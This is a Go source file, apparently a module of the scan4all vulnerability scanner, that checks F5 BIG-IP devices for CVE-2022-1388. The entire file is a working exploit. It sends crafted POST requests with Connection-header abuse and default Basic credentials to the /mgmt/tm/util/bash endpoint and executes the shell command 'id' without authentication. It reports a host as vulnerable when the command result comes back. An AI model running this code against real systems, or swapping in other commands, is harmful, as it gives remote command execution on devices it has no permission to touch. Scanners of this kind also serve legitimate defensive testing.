package f5

import (
	"fmt"
	"github.com/hktalent/scan4all/pkg"
)

func CVE_2022_1388(u string) bool {
	header1 := make(map[string]string)
	header1["Authorization"] = "Basic YWRtaW46"
	header1["Connection"] = "X-F5-Auth-Token, X-Forwarded-Host"
	header1["X-F5-Auth-Token"] = "a"
	header1["X-Forwarded-For"] = "localhost"
	header1["Content-Type"] = "application/json"
	header1["Referer"] = "localhost"
	data := "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
	if req, err := pkg.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header1); err == nil {
		if req.StatusCode == 200 && pkg.StrContains(req.Body, "commandResult") {
			pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2022_1388|--\"%s\"\n", u))
			return true
		} else {
			header1["Authorization"] = "Basic ZjVodWJibGVsY2RhZG1pbjo="
			if req, err := pkg.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header1); err == nil {
				if req.StatusCode == 200 && pkg.StrContains(req.Body, "commandResult") {
					pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2022_1388|--\"%s\"\n", u))
					return true
				}
			} else {
				header2 := make(map[string]string)
				header2["Authorization"] = "Basic YWRtaW46YWRtaW4="
				header2["Connection"] = "close, X-Forwarded-Host"
				header2["Content-Type"] = "application/json"
				if req, err := pkg.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header2); err == nil {
					if req.StatusCode == 200 && pkg.StrContains(req.Body, "commandResult") {
						pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2022_1388|--\"%s\"\n", u))
						return true
					}
				}
			}
		}
	}
	return false
}
